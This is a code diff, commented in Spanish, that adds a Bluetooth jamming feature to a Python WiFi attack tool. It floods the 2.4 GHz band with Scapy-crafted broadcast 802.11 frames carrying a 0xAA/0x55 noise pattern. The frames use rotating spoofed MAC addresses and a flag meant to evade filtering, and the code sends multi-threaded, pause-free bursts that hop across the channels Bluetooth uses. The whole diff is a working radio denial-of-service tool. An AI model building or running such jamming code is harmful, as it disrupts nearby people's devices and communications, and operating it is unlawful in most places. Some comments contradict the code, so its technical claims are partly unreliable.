+        while len(sequence) < 150:  # Secuencia más larga para mejor cobertura
+            # Priorizar canales BLE advertising (cada N canales, uno de BLE adv)
+            if len(sequence) % (adv_weight + 2) == 0 and adv_idx < len(ble_adv_channels) * adv_weight:
+                sequence.append(ble_adv_channels[adv_idx % len(ble_adv_channels)])
+                adv_idx += 1
+            # Luego canales Bluetooth clásico
+            elif len(sequence) % 3 == 1 and bt_idx < len(shuffled_bt_classic):
+                sequence.append(shuffled_bt_classic[bt_idx])
+                bt_idx = (bt_idx + 1) % len(shuffled_bt_classic)
+            # Finalmente otros canales
+            else:
+                if other_idx < len(shuffled_other):
+                    sequence.append(shuffled_other[other_idx])
+                    other_idx = (other_idx + 1) % len(shuffled_other)
+                else:
+                    # Si se agotan, reiniciar
+                    other_idx = 0
+                    random.shuffle(shuffled_other)
+        
+        return sequence
+    
+    def _create_bluetooth_jam_packet(self, packet_size: int = None) -> Optional:
+        """Crea paquete optimizado para jamming Bluetooth (mejorado con técnicas de nRFBox)
+        
+        Usa patrón alternante 0xAA/0x55 como nRFBox para mejor interferencia.
+        
+        Args:
+            packet_size: Tamaño del paquete en bytes (None = usar config)
+            
+        Returns:
+            Paquete Scapy optimizado o None
+        """
+        if not SCAPY_AVAILABLE:
+            return None
+        
+        import config_wifi as config
+        
+        if packet_size is None:
+            packet_size = getattr(config, 'BT_JAM_PACKET_SIZE', 1500)
+        
+        # Limitar tamaño máximo razonable
+        packet_size = min(packet_size, 1500)
+        
+        # Usar patrón optimizado de nRFBox si está habilitado
+        use_pattern = getattr(config, 'BT_JAM_USE_OPTIMIZED_PATTERN', True)
+        
+        if use_pattern:
+            # Patrón alternante 0xAA/0x55 (basado en nRFBox)
+            pattern = getattr(config, 'BT_JAM_DATA_PATTERN', None)
+            if pattern and len(pattern) > 0:
+                # Repetir patrón hasta alcanzar el tamaño deseado
+                noise_data = (pattern * ((packet_size // len(pattern)) + 1))[:packet_size]
+            else:
+                # Patrón por defecto: alternancia 0xAA/0x55
+                noise_data = bytes([0xAA, 0x55] * ((packet_size // 2) + 1))[:packet_size]
+        else:
+            # Datos pseudo-aleatorios (modo alternativo)
+            import random
+            random.seed()
+            noise_data = bytes([random.randint(0, 255) for _ in range(packet_size)])
+        
+        # Variar MAC para evitar filtrado rápido
+        import random
+        mac_suffix = random.randint(0, 255)
+        mac_addr = f"00:11:22:33:44:{mac_suffix:02x}"
+        
+        packet = RadioTap() / Dot11(
+            type=2,  # Data frame
+            subtype=0,
+            addr1='ff:ff:ff:ff:ff:ff',  # Broadcast
+            addr2=mac_addr,  # MAC variada
+            addr3=mac_addr,
+            FCfield=0x01  # To DS flag para evitar filtrado rápido
+        ) / noise_data
+        
+        return packet
+    
+    def _bluetooth_jam_channel_loop(self, bt_channel: int):
+        """Loop de jamming mejorado en un canal Bluetooth específico
+        
+        Args:
+            bt_channel: Canal Bluetooth (0-78)
+        """
+        interface = self.monitor_interface or self.interface
+        if not interface:
+            return
+        
+        import config_wifi as config
+        
+        # Convertir canal Bluetooth a canal WiFi
+        bt_freq = self.bluetooth_channel_to_freq(bt_channel)
+        wifi_channel = self.bluetooth_freq_to_wifi_channel(bt_freq)
+        
+        # Configuración mejorada (optimizada con técnicas de nRFBox)
+        aggressive = getattr(config, 'BT_JAM_AGGRESSIVE_MODE', True)
+        burst_count = getattr(config, 'BT_JAM_BURST_COUNT', 100) if aggressive else 20
+        burst_interval = getattr(config, 'BT_JAM_BURST_INTERVAL', 0.0)  # Sin pausa (como nRFBox)
+        
+        while self.bt_jamming_active:
+            try:
+                # Cambiar al canal WiFi correspondiente
+                if not self.set_channel(wifi_channel, silent=True):
+                    time.sleep(0.01)  # Pausa mínima solo si falla
+                    continue
+                
+                # Pausa mínima después de cambiar canal (reducida)
+                time.sleep(0.001)  # 1 ms para estabilizar (más rápido)
+                
+                # Transmitir ráfagas de paquetes optimizados (modo agresivo mejorado)
+                try:
+                    if SCAPY_AVAILABLE:
+                        # Crear paquete optimizado con patrón nRFBox
+                        jam_packet = self._create_bluetooth_jam_packet()
+                        
+                        if jam_packet:
+                            # Enviar ráfaga agresiva SIN pausas (como nRFBox)
+                            sendp(jam_packet, iface=interface, count=burst_count,  # noqa: F405 
+                                inter=burst_interval, verbose=False)
+                            
+                            # En modo agresivo, enviar múltiples ráfagas consecutivas
+                            if aggressive:
+                                # Segunda ráfaga inmediata (sin pausa)
+                                sendp(jam_packet, iface=interface, count=burst_count,  # noqa: F405 
+                                    inter=burst_interval, verbose=False)
+                                # Tercera ráfaga para saturación máxima
+                                sendp(jam_packet, iface=interface, count=burst_count // 2, 
+                                    inter=burst_interval, verbose=False)
+                
+                except Exception as e:
+                    # Continuar aunque falle una transmisión
+                    pass
+                
+                # Pausa mínima optimizada (eliminada en modo agresivo, como nRFBox)
+                if not aggressive:
+                    time.sleep(0.000625)  # 1 slot Bluetooth (625 μs)
+                # En modo agresivo: sin pausa, continuar inmediatamente
+                
+            except Exception:
+                time.sleep(0.01)  # Pausa mínima solo en errores
+                continue
+    
+    def start_bluetooth_jamming(self, hop_enabled: bool = True, target_channels: List[int] = None) -> bool:
+        """Inicia jamming Bluetooth usando interferencia WiFi en banda 2.4 GHz
+        
+        NOTA: Este método usa interferencia WiFi para afectar Bluetooth.
+        El adaptador TP-Link TL-WN722N no soporta Bluetooth nativo, por lo que
+        usa transmisión WiFi continua en los canales 2.4 GHz para saturar
+        el espectro y afectar dispositivos Bluetooth cercanos.
+        
+        Args:
+            hop_enabled: Si True, hace frequency hopping siguiendo patrones Bluetooth
+            target_channels: Lista de canales Bluetooth específicos (0-78), None = todos
+            
+        Returns:
+            bool: True si se inició correctamente
+        """
+        if not SCAPY_AVAILABLE:
+            print("ERROR: scapy no está disponible. Instala con: pip install scapy")
+            return False
+        
+        try:
+            interface = self.monitor_interface or self.interface
+            if not interface:
+                return False
+            
+            # Verificar modo monitor
+            if not self.monitor_mode:
+                print("Activando modo monitor para jamming Bluetooth...")
+                if not self.set_monitor_mode(True):
+                    print("ERROR: No se pudo activar modo monitor.")
+                    return False
+            
+            # Detener cualquier jamming Bluetooth activo
+            self.stop_bluetooth_jamming()
+            
+            self.bt_jamming_active = True
+            
+            if hop_enabled:
+                # Jamming con frequency hopping
+                if target_channels:
+                    # Jamming en canales específicos
+                    channels_to_jam = target_channels
+                else:
+                    # Jamming en todos los canales Bluetooth (0-78)
+                    channels_to_jam = list(range(79))
+                
+                print(f"Iniciando jamming Bluetooth mejorado con frequency hopping ({len(channels_to_jam)} canales)...")
+                print("NOTA: Usando interferencia WiFi optimizada para afectar Bluetooth.")
+                
+                # Optimización mejorada: Mapear canales BT a canales WiFi
+                import config_wifi as config
+                aggressive = getattr(config, 'BT_JAM_AGGRESSIVE_MODE', True)
+                
+                if aggressive and len(channels_to_jam) > 20:
+                    # Estrategia optimizada: usar mapeo WiFi para threads eficientes
+                    wifi_mapping = self.bluetooth_channels_to_wifi_channels(channels_to_jam)
+                    
+                    # Crear un thread por cada canal WiFi usado
+                    self.bt_jam_threads = []
+                    for wifi_ch, bt_chs in wifi_mapping.items():
+                        thread = threading.Thread(
+                            target=self._bluetooth_jam_wifi_channel_loop,
+                            args=(wifi_ch, bt_chs),
+                            daemon=True
+                        )
+                        thread.start()
+                        self.bt_jam_threads.append(thread)
+                    
+                    num_threads = len(wifi_mapping)
+                    print(f"✓ Jamming Bluetooth optimizado iniciado ({num_threads} threads WiFi, {len(channels_to_jam)} canales BT)")
+                else:
+                    # Estrategia original mejorada: dividir canales BT directamente
+                    num_threads = min(len(channels_to_jam), 14)
+                    channels_per_thread = len(channels_to_jam) // num_threads
+                    
+                    self.bt_jam_threads = []
+                    for i in range(num_threads):
+                        start_idx = i * channels_per_thread
+                        end_idx = start_idx + channels_per_thread if i < num_threads - 1 else len(channels_to_jam)
+                        thread_channels = channels_to_jam[start_idx:end_idx]
+                        
+                        if thread_channels:
+                            thread = threading.Thread(
+                                target=self._bluetooth_jam_hop_loop,
+                                args=(thread_channels,),
+                                daemon=True
+                            )
+                            thread.start()
+                            self.bt_jam_threads.append(thread)
+                    
+                    print(f"✓ Jamming Bluetooth iniciado ({num_threads} threads, frequency hopping activo)")
+                
+                print(f"  Interfaz: {interface}")
+                print(f"  Canales Bluetooth: {len(channels_to_jam)}")
+                print(f"  Modo agresivo: {'SÍ' if aggressive else 'NO'}")
+                print(f"\nPara detener: btjam (de nuevo) o stop_bt_jamming\n")
+                
+            else:
+                # Jamming en canal específico (sin hopping)
+                if target_channels and len(target_channels) > 0:
+                    channel = target_channels[0]
+                else:
+                    channel = 39  # Canal Bluetooth medio por defecto
+                
+                print(f"Iniciando jamming Bluetooth en canal {channel}...")
+                
+                self.bt_jam_thread = threading.Thread(
+                    target=self._bluetooth_jam_channel_loop,
+                    args=(channel,),
+                    daemon=True
+                )
+                self.bt_jam_thread.start()
+                
+                print(f"✓ Jamming Bluetooth iniciado (canal {channel})")
+                print(f"  Interfaz: {interface}")
+                print(f"\nPara detener: btjam (de nuevo) o stop_bt_jamming\n")
+            
+            return True
+            
+        except Exception as e:
+            print(f"ERROR iniciando jamming Bluetooth: {e}")
+            return False
+    
+    def _bluetooth_jam_hop_loop(self, channels: List[int]):
+        """Loop mejorado de jamming Bluetooth con frequency hopping optimizado
+        
+        Args:
+            channels: Lista de canales Bluetooth para hacer hopping
+        """
+        interface = self.monitor_interface or self.interface
+        if not interface:
+            return
+        
+        import config_wifi as config
+        
+        # Configuración mejorada (optimizada con técnicas de nRFBox)
+        aggressive = getattr(config, 'BT_JAM_AGGRESSIVE_MODE', True)
+        hop_multiplier = getattr(config, 'BT_JAM_HOP_RATE_MULTIPLIER', 3.0)  # Aumentado
+        burst_count = getattr(config, 'BT_JAM_BURST_COUNT', 100) if aggressive else 20
+        burst_interval = getattr(config, 'BT_JAM_BURST_INTERVAL', 0.0)  # Sin pausa
+        
+        # Usar secuencia mejorada de hopping (con canales BLE prioritarios de nRFBox)
+        hop_sequence = self._generate_bt_hop_sequence()
+        channel_index = 0
+        hop_counter = 0
+        
+        # Tiempo de slot Bluetooth (625 μs)
+        bt_slot_time = 0.000625
+        
+        while self.bt_jamming_active:
+            try:
+                # Obtener siguiente canal usando secuencia mejorada (prioriza BLE 2, 26, 80)
+                if channel_index >= len(channels):
+                    channel_index = 0
+                
+                # Priorizar canales en la secuencia mejorada (BLE advertising primero)
+                if hop_counter < len(hop_sequence):
+                    preferred_channel = hop_sequence[hop_counter % len(hop_sequence)]
+                    # Si el canal preferido está en nuestra lista, usarlo
+                    if preferred_channel in channels:
+                        bt_channel = preferred_channel
+                    else:
+                        bt_channel = channels[channel_index]
+                        channel_index += 1
+                else:
+                    bt_channel = channels[channel_index]
+                    channel_index += 1
+                
+                hop_counter += 1
+                
+                # Convertir a canal WiFi
+                bt_freq = self.bluetooth_channel_to_freq(bt_channel)
+                wifi_channel = self.bluetooth_freq_to_wifi_channel(bt_freq)
+                
+                # Cambiar al canal WiFi (sin pausa para ser más rápido)
+                channel_changed = self.set_channel(wifi_channel, silent=True)
+                
+                if not channel_changed:
+                    time.sleep(0.01)  # Pausa mínima solo si falla
+                    continue
+                
+                # Pausa mínima después de cambiar canal (reducida)
+                time.sleep(0.001)  # 1 ms para estabilizar (más rápido)
+                
+                # Transmitir ráfagas optimizadas (modo agresivo mejorado)
+                try:
+                    if SCAPY_AVAILABLE:
+                        # Crear paquete optimizado con patrón nRFBox
+                        jam_packet = self._create_bluetooth_jam_packet()
+                        
+                        if jam_packet:
+                            # Enviar ráfaga rápida SIN pausas (como nRFBox)
+                            sendp(jam_packet, iface=interface, count=burst_count,  # noqa: F405 
+                                inter=burst_interval, verbose=False)
+                            
+                            # En modo agresivo, múltiples ráfagas consecutivas sin pausa
+                            if aggressive:
+                                # Segunda ráfaga inmediata
+                                sendp(jam_packet, iface=interface, count=burst_count,  # noqa: F405 
+                                    inter=burst_interval, verbose=False)
+                                # Tercera ráfaga para saturación máxima
+                                sendp(jam_packet, iface=interface, count=burst_count // 2, 
+                                    inter=burst_interval, verbose=False)
+                
+                except Exception:
+                    # Continuar aunque falle
+                    pass
+                
+                # En modo agresivo: sin pausa, continuar inmediatamente (como nRFBox)
+                # Solo pausa mínima si no es agresivo
+                if not aggressive:
+                    # Tiempo optimizado con multiplicador
+                    sleep_time = bt_slot_time * 4 * (1.0 / hop_multiplier)
+                    time.sleep(sleep_time)
+                # Modo agresivo: sin pausa, cambio inmediato de canal
+                
+            except Exception:
+                time.sleep(0.01)  # Pausa mínima solo en errores
+                continue
+    
+    def _bluetooth_jam_wifi_channel_loop(self, wifi_channel: int, bt_channels: List[int]):
+        """Loop optimizado de jamming en un canal WiFi específico para múltiples canales BT
+        
+        Esta función mejora la eficiencia al permanecer en un canal WiFi y
+        transmitir continuamente para afectar todos los canales BT mapeados.
+        
+        Args:
+            wifi_channel: Canal WiFi a usar
+            bt_channels: Lista de canales Bluetooth que se mapean a este WiFi
+        """
+        interface = self.monitor_interface or self.interface
+        if not interface:
+            return
+        
+        import config_wifi as config
+        
+        aggressive = getattr(config, 'BT_JAM_AGGRESSIVE_MODE', True)
+        burst_count = getattr(config, 'BT_JAM_BURST_COUNT', 100) if aggressive else 20
+        burst_interval = getattr(config, 'BT_JAM_BURST_INTERVAL', 0.0)  # Sin pausa
+        
+        # Cambiar al canal WiFi una vez
+        if not self.set_channel(wifi_channel, silent=True):
+            return
+        
+        time.sleep(0.001)  # Pausa mínima para estabilizar (reducida)
+        
+        while self.bt_jamming_active:
+            try:
+                # Transmitir ráfagas continuas en este canal WiFi (mejorado con técnicas nRFBox)
+                # Como WiFi tiene 22 MHz de ancho, cubre múltiples canales BT
+                if SCAPY_AVAILABLE:
+                    jam_packet = self._create_bluetooth_jam_packet()
+                    
+                    if jam_packet:
+                        # Enviar ráfagas agresivas SIN pausas (como nRFBox)
+                        sendp(jam_packet, iface=interface, count=burst_count,  # noqa: F405 
+                            inter=burst_interval, verbose=False)
+                        
+                        if aggressive:
+                            # Múltiples ráfagas consecutivas sin pausa (saturación máxima)
+                            sendp(jam_packet, iface=interface, count=burst_count,  # noqa: F405 
+                                inter=burst_interval, verbose=False)
+                            sendp(jam_packet, iface=interface, count=burst_count // 2, 
+                                inter=burst_interval, verbose=False)
+                
+                # Modo agresivo: sin pausa, continuar inmediatamente
+                if not aggressive:
+                    time.sleep(0.002)  # Pausa mínima solo en modo normal
+                
+            except Exception:
+                time.sleep(0.01)
+                continue
+    
+    def stop_bluetooth_jamming(self):
+        """Detiene el jamming Bluetooth"""
+        try:
+            self.bt_jamming_active = False
+            
+            # Detener threads
+            if hasattr(self, 'bt_jam_threads') and self.bt_jam_threads:
+                for thread in self.bt_jam_threads:
+                    if thread and thread.is_alive():
+                        pass  # Se detendrá automáticamente
+                self.bt_jam_threads = []
+            
+            if hasattr(self, 'bt_jam_thread') and self.bt_jam_thread:
+                if self.bt_jam_thread.is_alive():
+                    self.bt_jam_thread.join(timeout=2)
+                self.bt_jam_thread = None
+            
+        except Exception as e:
+            print(f"Advertencia al detener jamming Bluetooth: {e}")
+    
     def cleanup(self):
         """Limpia recursos de forma segura"""
         try:
             self._stop_capture_thread()
             self.stop_jamming()
+            self.stop_bluetooth_jamming()
             if self.monitor_mode:
                 self.set_monitor_mode(False)
             self.packet_buffer.clear()
